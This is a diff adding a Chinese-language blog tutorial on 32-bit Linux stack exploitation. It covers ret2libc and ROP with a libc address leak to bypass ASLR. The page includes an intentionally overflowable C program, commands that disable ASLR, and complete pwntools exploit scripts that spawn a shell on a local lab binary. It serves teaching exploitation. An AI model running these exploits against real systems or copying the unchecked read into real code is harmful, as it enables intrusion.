@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="0x00 准备环境： kali 2016 07    32位工具： peda  pwntools ps:对于该篇文章使用的技术，最重要的一点基础是，清楚函数的调用的栈布局，以及一些汇编指令的理解，清楚这些理解起来会很轻松。 漏洞程序： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt;  void">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[pwn] ret2libc &amp;&amp; ROP">
+<meta property="og:url" content="http://example.com/2018/03/30/ret2libc-rop/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="0x00 准备环境： kali 2016 07    32位工具： peda  pwntools ps:对于该篇文章使用的技术，最重要的一点基础是，清楚函数的调用的栈布局，以及一些汇编指令的理解，清楚这些理解起来会很轻松。 漏洞程序： #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt;  void">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_1_1.png">
+<meta property="og:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_1_2.png">
+<meta property="og:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_1_3.png">
+<meta property="og:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_1_4.png">
+<meta property="og:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_2_1.png">
+<meta property="og:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_2_2.png">
+<meta property="og:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_2_3.png">
+<meta property="og:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_2_4.png">
+<meta property="og:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_2_5.png">
+<meta property="article:published_time" content="2018-03-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2022-03-17T05:58:50.129Z">
+<meta property="article:author" content="PENCH3R">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2018/03/30/ret2libc-rop/ret2libc_1_1.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>[pwn] ret2libc &amp;&amp; ROP</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2018/03/30/dynelf-rop/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2018/03/28/linux-simple-stack-overflow/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/03/30/ret2libc-rop/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/03/30/ret2libc-rop/&text=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/03/30/ret2libc-rop/&is_video=false&description=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[pwn] ret2libc &amp;&amp; ROP&body=Check out this article: http://example.com/2018/03/30/ret2libc-rop/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/03/30/ret2libc-rop/&name=[pwn] ret2libc &amp;&amp; ROP&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/03/30/ret2libc-rop/&t=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">0x00 准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ret2libc"><span class="toc-number">2.</span> <span class="toc-text">0x01 ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-ROP"><span class="toc-number">3.</span> <span class="toc-text">0x02 ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        [pwn] ret2libc &amp;&amp; ROP
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">PENCH3R</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2018-03-29T16:00:00.000Z" itemprop="datePublished">2018-03-30</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/BinarySecurity/">BinarySecurity</a>
+    </div>
+
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x00-准备"><a href="#0x00-准备" class="headerlink" title="0x00 准备"></a>0x00 准备</h2><p>环境： kali 2016 07    32位<br>工具： peda  pwntools</p>
+<p>ps:对于该篇文章使用的技术，最重要的一点基础是，清楚函数的调用的栈布局，以及一些汇编指令的理解，清楚这些理解起来会很轻松。</p>
+<p>漏洞程序：</p>
+<pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+
+void vul_func() &#123;
+    char msg[128];
+    read(STDIN_FILENO, msg, 256);
+&#125;
+
+int main(int argc, char *argv[]) &#123;
+    vul_func();
+    write(STDOUT_FILENO,&quot;ROP test\n&quot;, 9); 
+    return 0;
+&#125;
+</code></pre>
+<p>运行:</p>
+<pre><code>gcc -g -fno-stack-protector -o vul vul.c    #编译,这次我们开启了NX保护
+
+socat TCP4-LISTEN:10000,fork exec:./vul        # 通过网络监听加载vul
+
+  nc 127.0.0.1 10000        # 客户端连接
+</code></pre>
+<h2 id="0x01-ret2libc"><a href="#0x01-ret2libc" class="headerlink" title="0x01 ret2libc"></a>0x01 ret2libc</h2><p>首先关闭ASLR</p>
+<pre><code>echo 0 &gt; /proc/sys/kernel/randomized_va_space
+</code></pre>
+<p>该技术主要是通过将返回地址，覆盖成为目标函数(例如system函数)，并在后续将参数压栈(x86的架构都是这样传递参数，x64有所不同)，达到函数调用的功能，通过这样的技术可以绕过DEP(NX)防护机制</p>
+<p>主要利用的原理</p>
+<p>思路：</p>
+<ul>
+<li>找到目标函数的地址</li>
+<li>找到符合参数的内容</li>
+<li>整合利用</li>
+</ul>
+<p>通过<code>gdb</code>加载我们的漏洞程序<code>vul</code>, 在<code>main</code>函数下断点(<code>break main</code>)然后执行程序(<code>r</code>)，使用<code>print system</code>查到<code>system</code>函数地址，用同样的方法也查找到<code>exit</code>函数地址</p>
+<img src="/2018/03/30/ret2libc-rop/ret2libc_1_1.png" class="">
+
+<p><code>system</code>函数的地址为<code>0xb7e3c850</code>,<code>exit</code>函数的地址为<code>0xb7e306c0</code>,继续查找<code>/bin/sh</code>这个是要作为<code>system</code>的参数进行传递的，使用<code>find /bin/sh</code>查找</p>
+<img src="/2018/03/30/ret2libc-rop/ret2libc_1_2.png" class="">
+
+<p><code>/bin/sh</code>字符串的地址为<code>0xb7f5ae64</code></p>
+<p>再通过上一篇的文章，使用peda的<code>pattern_create</code>和<code>pattern_offset</code>来查找偏移位置</p>
+<img src="/2018/03/30/ret2libc-rop/ret2libc_1_3.png" class="">
+
+<p>偏移地址为140，此时开始构造exp脚本</p>
+<pre>#!/usr/bin/python
+
+from pwn import *
+
+#p = process('./vul')  #local
+p = remote('127.0.0.1', 10000) #remote
+
+# debug
+#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
+#gdb.attach(proc.pidof(p)[0], gdbscript='b \*0x804843f\nr\n')
+
+payload_len = 140 
+system_addr = 0xb7e3c850
+exit_addr = 0xb7e306c0
+str_addr = 0xb7f5ae64
+
+payload =  "A"*payload_len + p32(system_addr) + p32(exit_addr) + p32(str_addr)
+
+p.send(payload)
+
+p.interactive()</pre>
+
+<p>脚本的核心为payload，下图为payload在栈中的布局</p>
+<pre>+---------------------+
+|                     |
+|                     |
+|                     |
+|                     |
+|                     |
+|                     |
++---------------------+
+|      "A" * 140      |
+|                     |
++---------------------+
+|     system_addr     |  <----+ overwrite return_address
++---------------------+
+|     exit_addr       |  <----+ exec exit function until system finish
++---------------------+
+|      str_buf        |  <----+ system arg  "/bin/sh"
++---------------------+
+|                     |
++---------------------+</pre>
+
+
+<p>运行测试</p>
+<img src="/2018/03/30/ret2libc-rop/ret2libc_1_4.png" class="">
+
+<h2 id="0x02-ROP"><a href="#0x02-ROP" class="headerlink" title="0x02 ROP"></a>0x02 ROP</h2><p>开启ASLR</p>
+<pre><code>echo 2 &gt; /proc/sys/kernel/randomized_va_space
+</code></pre>
+<p>在这里我们可以将ASLR保护打开，通过ROP来进行绕过，首先我们对比下开启ASLR后程序的区段到底有什么不同</p>
+<img src="/2018/03/30/ret2libc-rop/ret2libc_2_1.png" class="">
+
+<p>从图中可知，开启ASLR之后，程序本身的<code>image</code>映射的虚拟地址还是不变(程序本身定义的vul_func函数的地址还是固定的)的，但是<code>.so</code>的链接库(引用该库中的函数的地址在内存中都不是固定的)和<code>stack</code>地址是在不断变化的</p>
+<p>ROP利用也分很多种，我们这里列出的思路主要是通过泄露出libc.so中函数的地址，再通过该函数在libc.so中的固定偏移，来继续计算libc.so此时在内存中加载的起始地址(也叫基地址)，然后就可以通过偏移计算出我们需要的函数的地址(system地址)以及我们需要的字符串(/bin/sh)，这样我们就可以通过前面的技术继续构造exp</p>
+<p>需要获取的：</p>
+<ul>
+<li>libc.so中函数的地址</li>
+<li>获取Libc.so中特定函数以及字符串的偏移</li>
+</ul>
+<p>为了更好的理解利用过程，我们还需要认识一下<code>plt</code>和<code>got</code>。通过<code>objdump</code>的输出可以直观的看到plt项和got项，这里我们以<code>read</code>函数作为例子</p>
+<img src="/2018/03/30/ret2libc-rop/ret2libc_2_2.png" class="">
+
+<p><code>0x080482e0</code>为<code>read@plt</code>,<code>0x8049730</code>(该地址指向的内容为调用函数在内存中的地址)为<code>read@.got.plt</code>，程序在运行过程中调用函数时，首先会跳转到<code>read@plt</code>的地方，再调用jmp跳转到调用函数所处的真实地址。</p>
+<p>因此在这个漏洞程序中，通过将返回地址覆盖成为<code>write@plt</code>,再将<code>write@.got.plt</code>的地址作为参数，就可以读取到原始<code>write</code>函数此时在内存中的真实地址，后续通过偏移我们就可以计算出其他函数在内存中的地址，进行调用。</p>
+<p>ps：<code>.plt</code>和<code>.got.plt</code>是在程序镜像中保存的，因此地址并不会改变。</p>
+<p>首先测试看能否成功泄漏出write函数在内存中的地址，这里我们利用<code>pwntools</code>中的ELF对象中的symbols和got属性可以快速获取到目标文件中函数的<code>plt</code>和<code>got</code>，例如<code>ELF[&#39;./vul&#39;].symbols[&#39;write&#39;]</code>和<code>ELF[&#39;./vul&#39;].got[&#39;write&#39;]</code> </p>
+<pre>#!/usr/bin/python
+
+from pwn import *
+
+#p = process('./vul')
+p = remote('127.0.0.1', 10000)
+elf = ELF('./vul')
+
+payload_len = 140 
+write_plt_addr = elf.symbols['write']
+print "write plt addr " + hex(write_plt_addr)
+#wirte_plt = 0x08048300
+#write_got = 0x8049738
+write_plt_got_addr = elf.got['write']
+print "wirte plt got addr " + hex(write_plt_got_addr)
+vul_func = 0x0804841b
+
+payload = "A"*payload_len + p32(write_plt_addr) + p32(vul_func) + p32(1) + p32(write_plt_got_addr) + p32(4)
+print payload
+
+print "[*] begin to leak write_addr function address...\n"
+p.send(payload)
+
+write_addr = u32(p.recv(4))
+print "[+] the write_addr function address is " + hex(write_addr)
+
+p.interactive()</pre>
+
+<p>这一层的<code>payload</code>，由于<code>write</code>函数需要传递2个参数，一个为需要获取的<code>write.got.plt</code>地址，还有一个需要输出的长度这里为<code>4</code>，栈布局如下：</p>
+<pre>+---------------------+
+|                     |
+|                     |
+|                     |
++---------------------+
+|       A * 140       |
++---------------------+
+|  write_plt address  |  <----+ overwrite return address
++---------------------+
+|  vul_func address   |  <----+ exec vul_func until write exec finish
++---------------------+
+|          1          |  <----+ junk (optional)
++---------------------+
+|  write got address  |  <----+ write function first argument
++---------------------+
+|          4          |  <----+ write function second argument
++---------------------+
+|                     |
++---------------------+</pre>
+
+<p>这里为什么把<code>vul_func</code>的地址放置到<code>write</code>函数的返回地址处，是为了后续再次通过<code>vul_func</code>的溢出漏洞，构造获取shell的<code>payload2</code>，这个脚本中的payload目标只是为了获取内存中的<code>write</code>函数地址，方便后续获取<code>system</code>函数地址</p>
+<p>运行后，成功获取到write内存的地址</p>
+<img src="/2018/03/30/ret2libc-rop/ret2libc_2_3.png" class="">
+
+<p>接着我们需要通过获取到的<code>write</code>的内存地址，去分别计算<code>system_addr</code>和<code>/bin/sh</code>的地址，并将程序的执行返回到<code>vul_func</code>，再次发送我们新的<code>payload</code>, 这里我们还需要通过链接的.so文件去计算调用函数之间的偏移，通过ldd可以查看我们的程序链接了那些库文件</p>
+<img src="/2018/03/30/ret2libc-rop/ret2libc_2_4.png" class="">
+
+<p>同样可以利用ELF来计算之间的偏移，例如已知<code>write</code>的函数地址可以计算出<code>system</code>的地址</p>
+<pre><code>libc = ELF(&#39;/lib/i386-linux-gnu/libc.so.6&#39;)
+system_addr = write_addr - (libc.symbols[&#39;write&#39;] - libc.symbols[&#39;system&#39;])
+
+binsh_addr = write_addr - (libc.symbols[&#39;write&#39;] - next(libc.search(&#39;/bin/sh&#39;)))    # /bin/sh字符串在内存中的地址
+</code></pre>
+<p>最终的利用脚本</p>
+<pre>#!/usr/bin/python
+
+from pwn import *
+
+#p = process('./vul')
+p = remote('127.0.0.1', 10000)
+elf = ELF('./vul')
+libc = ELF('/lib/i386-linux-gnu/libc.so.6')
+
+payload_len = 140 
+write_plt_addr = elf.symbols['write']
+print "write plt addr " + hex(write_plt_addr)
+#wirte_plt = 0x08048300
+#write_got = 0x8049738
+write_plt_got_addr = elf.got['write']
+print "wirte plt got addr " + hex(write_plt_got_addr)
+vul_func = 0x0804841b
+
+payload = "A"*payload_len + p32(write_plt_addr) + p32(vul_func) + p32(1) + p32(write_plt_got_addr) + p32(4)
+
+print "[*] begin to leak write_addr function address...\n"
+p.send(payload)
+
+write_addr = u32(p.recv(4))
+print "[+] the write_addr function address is " + hex(write_addr)
+
+system_addr = write_addr - (libc.symbols['write'] - libc.symbols['system'])
+print "[+] the system_addr function address is " + hex(system_addr)
+binsh_addr = write_addr - (libc.symbols['write'] - next(libc.search('/bin/sh')))
+print "[+] the /bin/sh str address is " + hex(binsh_addr)
+
+print "[*] begin to get shell...\n"
+payload2 = "A"\*payload_len + p32(system_addr) + p32(vul_func) + p32(binsh_addr)
+
+p.send(payload2)
+
+p.interactive()</pre>
+
+<p>这个脚本中的payload2的内存布局就是传统的ret2libc的利用布局</p>
+<p>运行之后成功拿到shell</p>
+<img src="/2018/03/30/ret2libc-rop/ret2libc_2_5.png" class="">
+
+<h2 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h2><p>通过本地的实践操作，终于是理清了这2个技术中的细节，也解决了不少疑惑，后续还会带来其他的漏洞类型以及利用技术，这篇介绍的rop算是一种，后续还会有其他类型的</p>
+<p>KEEP GOING！！！</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/category/">Category</a></li>
+         
+          <li><a href="/tag/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-%E5%87%86%E5%A4%87"><span class="toc-number">1.</span> <span class="toc-text">0x00 准备</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ret2libc"><span class="toc-number">2.</span> <span class="toc-text">0x01 ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-ROP"><span class="toc-number">3.</span> <span class="toc-text">0x02 ROP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">0x03 总结</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2018/03/30/ret2libc-rop/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2018/03/30/ret2libc-rop/&text=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2018/03/30/ret2libc-rop/&is_video=false&description=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=[pwn] ret2libc &amp;&amp; ROP&body=Check out this article: http://example.com/2018/03/30/ret2libc-rop/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2018/03/30/ret2libc-rop/&title=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2018/03/30/ret2libc-rop/&name=[pwn] ret2libc &amp;&amp; ROP&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2018/03/30/ret2libc-rop/&t=[pwn] ret2libc &amp;&amp; ROP"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2017-2022
+    PENCH3R
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/category/">Category</a></li><!--
+     --><!--
+       --><li><a href="/tag/">Tag</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+  <script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js" crossorigin="anonymous"></script>
+  
+<script src="/js/wrapImage.js"></script>
+
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
